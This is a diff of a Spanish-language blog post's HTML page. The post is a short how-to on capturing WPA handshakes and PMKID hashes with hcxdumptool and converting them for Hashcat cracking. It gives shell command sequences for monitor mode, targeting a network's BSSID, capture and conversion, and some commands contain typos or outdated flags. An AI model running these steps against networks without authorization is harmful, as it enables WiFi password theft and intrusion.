@@ -9,8 +9,10 @@
   <meta property="og:url" content="https://imlauera.github.io/hcxdumptool/">
   <meta property="og:site_name" content="Imlauer">
   <meta property="og:title" content="Capturar handshakes y ataques PMKID con Hcxdumptool">
-  <meta property="og:description" content="hcxdumptool -&gt; hcxpcapngtool -&gt; hcxhashtool (additional hcxpsktool/hcxeiutool) -&gt; Hashcat
-sudo su airmon-ng check kill airmon-ng start wlp1s0 # Modo monitor airdump-ng wlp1s0 # Guarda la BSSID de la red que querés atacar en un archivo de texto echo &#34;BSSID&#34; &gt; myfilter.txt hcxdumptool -i wlp1s0 -w dumpfile.pcapng -F --rds=1 hcxdumptool -o capture.pcap -i wlp1s0 hcxpcaptool -m pmkid_hash.txt capture.pcap https://miloserdov.org/?p=7801">
+  <meta property="og:description" content="Al hacer un ataque PMKID no es necesario desautenticar al cliente para capturar el handshake. Este ataque se puede realizar sin clientes.
+Es importante tener la última versión de hcxdumptool:
+Desde la versión 6.3.0 las opciones hay cambiados por problemas de rendimiento. Esto fue mencionado en el changelog.
+-i wlan0mon –&gt; as mentioned in help it is not recommended to run hcxdumptool on a virtual monitor interface!!!!!! Do not use scripts like airmon-ng to set monitor mode before you run hcxdumptool, because hcxdumtool set its own monitor mode!!!!! Cadena de scripts que hay que usar: hcxdumptool -&gt; hcxpcapngtool -&gt; hcxhashtool (additional hcxpsktool/hcxeiutool) -&gt; Hashcat">
   <meta property="og:locale" content="es_es">
   <meta property="og:type" content="article">
     <meta property="article:published_time" content="2025-02-16T13:16:01-03:00">
@@ -19,17 +21,21 @@ sudo su airmon-ng check kill airmon-ng start wlp1s0 # Modo monitor airdump-ng wl
 
   
   <meta itemprop="name" content="Capturar handshakes y ataques PMKID con Hcxdumptool">
-  <meta itemprop="description" content="hcxdumptool -&gt; hcxpcapngtool -&gt; hcxhashtool (additional hcxpsktool/hcxeiutool) -&gt; Hashcat
-sudo su airmon-ng check kill airmon-ng start wlp1s0 # Modo monitor airdump-ng wlp1s0 # Guarda la BSSID de la red que querés atacar en un archivo de texto echo &#34;BSSID&#34; &gt; myfilter.txt hcxdumptool -i wlp1s0 -w dumpfile.pcapng -F --rds=1 hcxdumptool -o capture.pcap -i wlp1s0 hcxpcaptool -m pmkid_hash.txt capture.pcap https://miloserdov.org/?p=7801">
+  <meta itemprop="description" content="Al hacer un ataque PMKID no es necesario desautenticar al cliente para capturar el handshake. Este ataque se puede realizar sin clientes.
+Es importante tener la última versión de hcxdumptool:
+Desde la versión 6.3.0 las opciones hay cambiados por problemas de rendimiento. Esto fue mencionado en el changelog.
+-i wlan0mon –&gt; as mentioned in help it is not recommended to run hcxdumptool on a virtual monitor interface!!!!!! Do not use scripts like airmon-ng to set monitor mode before you run hcxdumptool, because hcxdumtool set its own monitor mode!!!!! Cadena de scripts que hay que usar: hcxdumptool -&gt; hcxpcapngtool -&gt; hcxhashtool (additional hcxpsktool/hcxeiutool) -&gt; Hashcat">
   <meta itemprop="datePublished" content="2025-02-16T13:16:01-03:00">
   <meta itemprop="dateModified" content="2025-02-16T13:16:01-03:00">
-  <meta itemprop="wordCount" content="58">
+  <meta itemprop="wordCount" content="183">
   <meta itemprop="keywords" content="Hacking">
   
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="Capturar handshakes y ataques PMKID con Hcxdumptool">
-  <meta name="twitter:description" content="hcxdumptool -&gt; hcxpcapngtool -&gt; hcxhashtool (additional hcxpsktool/hcxeiutool) -&gt; Hashcat
-sudo su airmon-ng check kill airmon-ng start wlp1s0 # Modo monitor airdump-ng wlp1s0 # Guarda la BSSID de la red que querés atacar en un archivo de texto echo &#34;BSSID&#34; &gt; myfilter.txt hcxdumptool -i wlp1s0 -w dumpfile.pcapng -F --rds=1 hcxdumptool -o capture.pcap -i wlp1s0 hcxpcaptool -m pmkid_hash.txt capture.pcap https://miloserdov.org/?p=7801">
+  <meta name="twitter:description" content="Al hacer un ataque PMKID no es necesario desautenticar al cliente para capturar el handshake. Este ataque se puede realizar sin clientes.
+Es importante tener la última versión de hcxdumptool:
+Desde la versión 6.3.0 las opciones hay cambiados por problemas de rendimiento. Esto fue mencionado en el changelog.
+-i wlan0mon –&gt; as mentioned in help it is not recommended to run hcxdumptool on a virtual monitor interface!!!!!! Do not use scripts like airmon-ng to set monitor mode before you run hcxdumptool, because hcxdumtool set its own monitor mode!!!!! Cadena de scripts que hay que usar: hcxdumptool -&gt; hcxpcapngtool -&gt; hcxhashtool (additional hcxpsktool/hcxeiutool) -&gt; Hashcat">
 
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -47,16 +53,12 @@ sudo su airmon-ng check kill airmon-ng start wlp1s0 # Modo monitor airdump-ng wl
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="referrer" content="no-referrer">
   <meta name="author" content="Imlauer.">
-  <meta name="description" content="hcxdumptool -&gt; hcxpcapngtool -&gt; hcxhashtool (additional hcxpsktool/hcxeiutool) -&gt; Hashcat
-sudo su
-airmon-ng check kill
-airmon-ng start wlp1s0 # Modo monitor
-airdump-ng wlp1s0 # Guarda la BSSID de la red que querés atacar en un archivo de texto
-echo &#34;BSSID&#34; &gt; myfilter.txt
-hcxdumptool -i wlp1s0 -w dumpfile.pcapng -F --rds=1
-hcxdumptool -o capture.pcap -i wlp1s0 
-hcxpcaptool -m pmkid_hash.txt capture.pcap
-https://miloserdov.org/?p=7801">
+  <meta name="description" content="Al hacer un ataque PMKID no es necesario desautenticar al cliente para capturar el handshake. Este ataque se puede realizar sin clientes.
+Es importante tener la última versión de hcxdumptool:
+Desde la versión 6.3.0 las opciones hay cambiados por problemas de rendimiento.  Esto fue mencionado en el changelog.
+-i wlan0mon &ndash;&gt; as mentioned in help it is not recommended to run hcxdumptool on a virtual monitor interface!!!!!! Do not use scripts like airmon-ng to set monitor mode before you run hcxdumptool, because hcxdumtool set  its own monitor mode!!!!!
+Cadena de scripts que hay que usar:
+hcxdumptool -&gt; hcxpcapngtool -&gt; hcxhashtool (additional hcxpsktool/hcxeiutool) -&gt; Hashcat">
 </head>
 <body><nav class="navbar is-transparent " role="navigation" aria-label="main navigation">
   <div class="navbar-brand">
@@ -104,15 +106,27 @@ https://miloserdov.org/?p=7801">
     <section class="section">
       <div class="container">
 <div class="content is-medium">
-  <p><code>hcxdumptool -&gt; hcxpcapngtool -&gt; hcxhashtool (additional hcxpsktool/hcxeiutool) -&gt; Hashcat</code></p>
+  <p>Al hacer un ataque PMKID no es necesario desautenticar al cliente para capturar el handshake. Este ataque se puede realizar sin clientes.</p>
+<p>Es importante tener la última versión de <code>hcxdumptool</code>:</p>
+<p>Desde la versión 6.3.0 las opciones hay cambiados por problemas de rendimiento.  Esto fue mencionado en el changelog.</p>
+<h3 id="-i-wlan0mon----as-mentioned-in-help-it-is-not-recommended-to-run-hcxdumptool-on-a-virtual-monitor-interface-do-not-use-scripts-like-airmon-ng-to-set-monitor-mode-before-you-run-hcxdumptool-because-hcxdumtool-set--its-own-monitor-mode">-i wlan0mon &ndash;&gt; as mentioned in help it is not recommended to run hcxdumptool on a virtual monitor interface!!!!!! Do not use scripts like airmon-ng to set monitor mode before you run hcxdumptool, because hcxdumtool set  its own monitor mode!!!!!</h3>
+<h3 id="cadena-de-scripts-que-hay-que-usar">Cadena de scripts que hay que usar:</h3>
+<p><code>hcxdumptool -&gt; hcxpcapngtool -&gt; hcxhashtool (additional hcxpsktool/hcxeiutool) -&gt; Hashcat</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo su
-</span></span><span style="display:flex;"><span>airmon-ng check kill
-</span></span><span style="display:flex;"><span>airmon-ng start wlp1s0 <span style="color:#75715e"># Modo monitor</span>
-</span></span><span style="display:flex;"><span>airdump-ng wlp1s0 <span style="color:#75715e"># Guarda la BSSID de la red que querés atacar en un archivo de texto</span>
+</span></span><span style="display:flex;"><span>ifconfig <span style="color:#75715e"># Ver nombre de tu interfaz WiFi.</span>
+</span></span><span style="display:flex;"><span>airdump-ng wlp1s0 <span style="color:#75715e"># Guarda la BSSID de la red que querés atacar en un archivo de texto </span>
 </span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;BSSID&#34;</span> &gt; myfilter.txt
 </span></span><span style="display:flex;"><span>hcxdumptool -i wlp1s0 -w dumpfile.pcapng -F --rds<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
 </span></span><span style="display:flex;"><span>hcxdumptool -o capture.pcap -i wlp1s0 
 </span></span><span style="display:flex;"><span>hcxpcaptool -m pmkid_hash.txt capture.pcap
+</span></span></code></pre></div><p><code>-o</code> fue reemplazado por <code>-w</code>
+<code>--filterlist=f2-text.txt</code> fue reemplazado por <code>--bpf</code>
+<code>--filtermode=2</code> fue reemplazado por <code>--bpf</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/ZerBea/hcxdumptool
+</span></span><span style="display:flex;"><span>make
+</span></span><span style="display:flex;"><span>sudo make install
+</span></span><span style="display:flex;"><span>hcxdumptool -I 
+</span></span><span style="display:flex;"><span>hcxdumptool -i INTERFACE -o file.pcapng --active_beacon --enable_status<span style="color:#f92672">=</span><span style="color:#ae81ff">15</span>
 </span></span></code></pre></div><p><a href="https://miloserdov.org/?p=7801">https://miloserdov.org/?p=7801</a></p>
 
 </div>
